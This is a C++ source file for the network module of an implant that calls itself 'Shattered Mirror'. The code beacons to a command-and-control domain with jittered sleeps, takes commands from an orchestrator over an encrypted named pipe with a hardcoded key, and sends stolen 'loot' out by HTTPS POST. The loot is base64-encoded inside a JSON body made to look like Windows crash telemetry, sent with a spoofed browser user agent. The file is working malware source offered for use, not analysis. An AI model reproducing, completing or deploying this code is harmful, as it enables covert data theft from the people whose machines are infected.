/*=============================================================================
 * Shattered Mirror v1 — Atom 01: Network Communicator
 *
 * Implements WinHTTP beaconing masked as JSON telemetry. 
 * Connects to Orchestrator via IPC to receive Loot/Commands.
 * Uses dynamic configuration and detailed logging.
 *===========================================================================*/

#include "Atom_01_Net.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include "../Orchestrator/Logger.h"
#include <cstdio>
#include <ctime>

#pragma comment(lib, "winhttp.lib")

/* Helper to convert simple strings for JSON (Base64 Encode) */
static void Base64Encode(const BYTE* pBuf, DWORD dwLen, char* szOut) {
    if (!pBuf || !szOut) return;
    static const char cb64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    int i, j;
    for (i = 0, j = 0; i < (int)dwLen; i += 3) {
        int v = pBuf[i];
        v = (v << 8) | (i + 1 < (int)dwLen ? pBuf[i + 1] : 0);
        v = (v << 8) | (i + 2 < (int)dwLen ? pBuf[i + 2] : 0);

        szOut[j++] = cb64[(v >> 18) & 0x3F];
        szOut[j++] = cb64[(v >> 12) & 0x3F];
        if (i + 1 < (int)dwLen) szOut[j++] = cb64[(v >> 6) & 0x3F]; else szOut[j++] = '=';
        if (i + 2 < (int)dwLen) szOut[j++] = cb64[v & 0x3F]; else szOut[j++] = '=';
    }
    szOut[j] = '\0';
}

/*---------------------------------------------------------------------------
 *  ExfiltrateTelemetry
 *  Disguises payload in a JSON body (mimicking Windows diagnostic data)
 *-------------------------------------------------------------------------*/
BOOL ExfiltrateTelemetry(const BYTE* pLoot, DWORD dwLength, const WCHAR* szDomain, INTERNET_PORT wPort) {
    if (!pLoot || dwLength == 0) return FALSE;

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return FALSE;

    HINTERNET hConnect = WinHttpConnect(hSession, szDomain, wPort, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    /* FIX: Match SSL settings to Port */
    DWORD dwFlags = (wPort == 443) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v2/telemetry",
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            dwFlags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    /* Use dynamic PSK ID */
    std::wstring headers = L"Content-Type: application/json\r\nX-Telemetry-ID: " + std::wstring(Config::PSK_ID, Config::PSK_ID + strlen(Config::PSK_ID)) + L"\r\n";
    WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);

    char* szB64Payload = (char*)malloc(((dwLength + 2) / 3) * 4 + 1);
    if (!szB64Payload) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }
    Base64Encode(pLoot, dwLength, szB64Payload);

    char szJsonBody[8192] = { 0 }; 
    snprintf(szJsonBody, sizeof(szJsonBody), "{\"report_id\":\"user_crash_01\",\"diagnostic_blob\":\"%s\"}", szB64Payload);
    free(szB64Payload);

    BOOL bResults = WinHttpSendRequest(hRequest,
                                       WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                       (LPVOID)szJsonBody, (DWORD)strlen(szJsonBody),
                                       (DWORD)strlen(szJsonBody), 0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return bResults;
}

/*---------------------------------------------------------------------------
 *  NetworkAtomMain
 *-------------------------------------------------------------------------*/
DWORD WINAPI NetworkAtomMain(LPVOID lpParam) {
    PNET_CONFIG pConfig = (PNET_CONFIG)lpParam;
    if (!pConfig) return 1;

    HANDLE hPipe = IPC_ConnectToPipe(pConfig->dwAtomId);
    if (!hPipe) return 1;

    BYTE SharedSessionKey[] = "bgKnKFK7SLK4hbdQ";

    while (TRUE) {
        DWORD dwSleepTime = pConfig->dwJitterMin + (rand() % (pConfig->dwJitterMax - pConfig->dwJitterMin));
        Sleep(dwSleepTime); 

        IPC_MESSAGE hbMsg = { 0 };
        hbMsg.CommandId = CMD_HEARTBEAT;
        hbMsg.dwPayloadLen = 0;
        IPC_SendMessage(hPipe, &hbMsg, SharedSessionKey, sizeof(SharedSessionKey));

        DWORD dwAvail = 0;
        if (PeekNamedPipe(hPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
            IPC_MESSAGE inMsg = { 0 };
            if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, sizeof(SharedSessionKey))) {
                
                if (inMsg.CommandId == CMD_REPORT) {
                    WCHAR wDomain[256] = { 0 };
                    MultiByteToWideChar(CP_ACP, 0, Config::C2_DOMAIN, -1, wDomain, 256);
                    ExfiltrateTelemetry(inMsg.Payload, inMsg.dwPayloadLen, wDomain, (INTERNET_PORT)Config::C2_PORT);
                }
            }
        }
    }

    return 0;
}
